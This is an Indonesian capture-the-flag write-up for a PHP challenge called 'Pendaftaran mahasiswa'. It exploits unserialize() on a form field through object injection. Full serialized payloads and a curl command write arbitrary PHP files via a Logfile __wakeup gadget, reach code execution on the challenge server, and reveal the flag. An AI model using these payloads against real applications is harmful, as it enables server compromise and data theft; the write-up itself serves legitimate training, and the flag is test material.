## Pendaftaran mahasiswa

### Deskripsi

Halo Kaka, saya mau minta tolong, website kampus Ganteng Ganteng Culun saya sedang error, tidak bisa melakukan pendaftara sejak kemarin, saya bukan programmer, saya mohon bantuan kaka semua ya kak, ini [source codenya kak](https://mega.nz/file/X6ZXSKBK#R9o9PSE4IX1zNYlS5P3kRiu8Vo8A-16yfzkY4OULH8M)

[http://103.147.32.214:9000/](http://103.147.32.214:9000/)

### Solusi

Jika diperhatikan pada source `daftar.php`

```php
$mahasiswa = unserialize($_POST['nama']);
```

variable $mahasiswa melakukan unserialize terhadap `$_POST['nama']` artinya ini termasuk kedalam Object Injection pada php. selanjutnya pada file `Inc/Mahasiswa.php`

```php
if($this->isAuth){
    echo readfile("/application/src/secret.txt");
}else{
    echo "Halo " .$this->nama;
}
```

dimana variable `$this->isAuth` tidak pernah didifinisikan, secara teori `echo readfile("/application/src/secret.txt");` tidak akan pernah di eksekusi, target pertama adalah merubah variable `$this->isAuth` menjadi true sehingga `readfile("/application/src/secret.txt");` bisa tereksekusi

```php
<?php 
class Mahasiswa
{
    public function __construct()
    {
        $this->nama = "test";
        $this->isAuth = true;
    }

}

$obj = new Mahasiswa();
echo serialize($obj);
```

menjadi payload

```php
O:9:"Mahasiswa":2:{s:4:"nama";s:4:"test";s:6:"isAuth";b:1;}
```

pada saat mengirimkan payload melalui form, input hanya dibatasi 25 karanter

```html
<input type="text" name="nama" class="form-control" id="nama" required maxlength="25">
```

dengan merubah `maxlength=25` menjadi `maxlength=2500` masalah ini teratasi, atau bisa menggunakan curl command untuk mengirimkan payloadnya.

```bash
curl --location --request POST 'http://103.147.32.214:9000/daftar.php' \
--form 'nama="O:9:\"Mahasiswa\":2:{s:4:\"nama\";s:4:\"test\";s:6:\"isAuth\";b:1;}"'

```

mendapatkan hasil

```bash
______ _   _ ______ _____ _____  _____
| ___ \ | | || ___ \  __ \  __ \/  __ \
| |_/ / |_| || |_/ / |  \/ |  \/| /  \/
|  __/|  _  ||  __/| | __| | __ | |
| |   | | | || |   | |_\ \ |_\ \| \__/\
\_|   \_| |_/\_|    \____/\____/ \____/
----- PHP Generic Gadget Chains -------
```

ternyata bukan flag, merujuk pada PHP Generic Gadget Chains, artinya bisa memanfaatkan RCE atau Remote Command Execution, jika dilihat lagi source pada file `LogFile.php`

```php
class Logfile {
    public function __wakeup()
    {
        file_put_contents($this->filename, $this->content);
    }
}
```

kita bisa mengirimkan data untuk menulis file yang bisa di eksekusi, untuk itu payloadnya harus dirubah, yang perlu diperhatikan adalah file LogFile.php menggunakan magic method `__wakeup()` untuk menulis file, jadi harus menggunakan oppositenya yaitu `__construct()` 

```php
class Logfile {
    public function __construct()
    {
        $this->filename = '/application/src/info.php';
        $this->content = '<?php phpinfo();?>';
    }
}

class Mahasiswa
{
    public function __construct()
    {
        $this->nama = "test";
        $this->isAuth = new Logfile();
    }

}

$obj = new Mahasiswa();
echo serialize($obj);

```

dengan hasil payload 

```php
O:9:"Mahasiswa":2:{s:4:"nama";s:4:"test";s:6:"isAuth";O:7:"Logfile":2:{s:8:"filename";s:25:"/application/src/info.php";s:7:"content";s:18:"<?php phpinfo();?>";}}

```

payload ini akan meng-create file dengan nama info.php dengan isi `<?php phpinfo();?>` kemudian diakses melalui url `http://103.147.32.214:9000/info.php` dari hasil ini bisa diketahui beberapa fungsi php di-disable jadi harus sedikit kreatif dalam menemukan payload yang tepat.


```php
O:9:"Mahasiswa":2:{s:4:"nama";s:4:"test";s:6:"isAuth";O:7:"Logfile":2:{s:8:"filename";s:26:"/application/src/pwned.php";s:7:"content";s:62:"<?php echo readfile("/application/resources/flag/flag.txt");?>";}}

```

setelah diakses melalui url `http://103.147.32.214:9000/pwned.php` hasilnya adalah 

```
lastctf{p3rk3n4lk4n_n4m4_54y4_php_93n3r1c_94d93t_ch41n}
```

